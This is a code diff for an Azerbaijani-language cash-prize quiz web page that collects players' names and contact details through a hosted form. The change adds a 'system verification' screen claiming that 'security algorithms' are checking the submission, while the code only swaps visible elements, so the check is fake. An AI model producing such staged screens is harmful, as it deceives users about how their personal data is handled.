@@ -27,6 +27,12 @@
         .security-notice { font-size: 12px; color: #94a3b8; background: rgba(148, 163, 184, 0.1); padding: 8px; border-radius: 5px; margin-bottom: 15px; text-align: left; border-left: 3px solid #f59e0b; }
         [data-fs-success] { color: #4ade80; background-color: rgba(74, 222, 128, 0.1); padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; font-weight: bold; }
         [data-fs-error] { color: #f87171; background-color: rgba(248, 113, 113, 0.1); padding: 10px; border-radius: 5px; margin-bottom: 15px; display: none; font-weight: bold; }
+        
+        /* Yeni yoxlanış ekranı üçün xüsusi dizayn */
+        .loading-dots span { animation: blink 1.4s infinite both; font-size: 30px; }
+        .loading-dots span:nth-child(2) { animation-delay: .2s; }
+        .loading-dots span:nth-child(3) { animation-delay: .4s; }
+        @keyframes blink { 0% { opacity: .2; } 20% { opacity: 1; } 100% { opacity: .2; } }
     </style>
 </head>
 <body>
@@ -36,7 +42,7 @@
         
         <div id="start-screen">
             <h2>Xoş Gəlmisiniz!</h2>
-            <p><strong>Oyun haqqında məlumat:</strong> Bu intellektual yarışmada sizə müxtəlif məbləğli məntiq və bilik sualları təqdim olunacaq. Hər düzgün cavab uduşunuzu artırır. Oyunun sonunda YouTube kanalımıza abunə olub, son videolarımızı bəyənib rəy yazsanız, uduşunuzun üzərinə əlavə <strong>3 AZN Bonus</strong> gələcəkdir! Bonus linki qeydiyyat formasının altında yerləşir.</p>
+            <p><strong>Oyun haqqında məlumat:</strong> Bu intellektual yarışmada sizə müxtəlif məbləğli məntiq və bilik sualları təqdim olunacaq. Hər düzgün cavab uduşunuzu artırır.</p>
             
             <input type="text" id="user-fullname" placeholder="Adınız və Soyadınız" required>
             <button class="btn" onclick="startGame()">Oyuna Başla</button>
@@ -87,13 +93,25 @@
                 
                 <button type="submit" class="btn" data-fs-submit-btn style="background-color: #22c55e;">Qeydiyyatı Tamamla</button>
             </form>
-
-            <div class="section">
-                <h3>🎁 3 AZN Əlavə Bonus Kampaniyası!</h3>
-                <p>Uduşunuzun üzərinə 3 AZN əlavə olunması üçün rəsmi YouTube kanalımıza keçid edin, abunə olun və son videolarımızı bəyənib rəy yazın:</p>
-                <a href="https://www.youtube.com/@Milyoncu-Oyunu" target="_blank" class="link">👉 Milyonçu Oyunu - YouTube Kanalına Keçid</a>
-            </div>
         </div>
+
+        <div id="verification-screen" class="hidden">
+            <h2 style="color: #f59e0b;">Sistem Yoxlanışı Aparılır...</h2>
+            <div class="loading-dots" style="margin: 20px 0;">
+                <span style="color: #f59e0b;">●</span> <span style="color: #2563eb;">●</span> <span style="color: #22c55e;">●</span>
+            </div>
+            <p style="font-size: 18px; color: #4ade80; font-weight: bold; background: rgba(74, 222, 128, 0.1); padding: 15px; border-radius: 5px;">
+                Məlumatlarınız ötürüldü və qeydiyyat uğurla tamamlandı!
+            </p>
+            <p style="text-align: left; margin-top: 20px;">
+                Sistem hazırda daxil etdiyiniz sual cavablarını, xalları və qeydiyyat məlumatlarınızı təhlükəsizlik alqoritmləri ilə yoxlayır. 
+            </p>
+            <p style="text-align: left; font-weight: bold; color: #f87171;">
+                ⚠️ Diqqət: Əgər hər hansı bir uyğunsuzluq və ya səhvlik aşkar olunarsa, daxil etdiyiniz əlaqə vasitələri (WhatsApp və ya Zəng) üzərindən sizinlə dərhal əlaqə saxlanılacaqdır.
+            </p>
+            <p style="color: #94a3b8; font-size: 14px; margin-top: 30px;">Zəhmət olmasa bu səhifəni bağlamayın, yoxlanış davam edir...</p>
+        </div>
+
     </div>
 
     <script src="game.js"></script>
@@ -104,8 +122,10 @@
         formElement: "#my-form",
         formId: "mbdbbnwb",
         onSuccess: function() {
-            document.getElementById("fs-success-msg").style.display = "block";
-            document.getElementById("fs-error-msg").style.display = "none";
+            // Qeydiyyat pəncərəsini gizlədirik
+            document.getElementById("end-screen").classList.add("hidden");
+            // İstədiyiniz yeni "Sistem yoxlayır" pəncərəsini açırıq
+            document.getElementById("verification-screen").classList.remove("hidden");
         },
         onError: function() {
             document.getElementById("fs-error-msg").style.display = "block";
